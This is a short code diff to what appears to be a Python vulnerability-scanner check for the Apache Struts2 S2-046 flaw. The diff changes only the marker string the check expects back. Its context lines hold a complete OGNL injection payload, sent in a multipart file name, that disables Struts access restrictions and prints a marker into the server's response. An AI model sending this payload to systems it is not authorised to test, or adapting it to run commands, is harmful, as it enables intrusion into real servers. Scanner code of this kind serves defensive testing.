@@ -16,7 +16,7 @@ def prove(data):
     data = init(data, 'struts')
     if data['url'] != None:
         prove_poc = '''%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_vul')).(#res.getWriter().print('struts2_security_vul_str2046')).(#res.getWriter().flush()).(#res.getWriter().close())}\0b'''
-        poc_key = "struts2_security_vul"
+        poc_key = "struts2_security_vul_str2046"
         try:
             files = {"test": (prove_poc, "text/plain")}
             res = curl('post', data['url'], files=files)
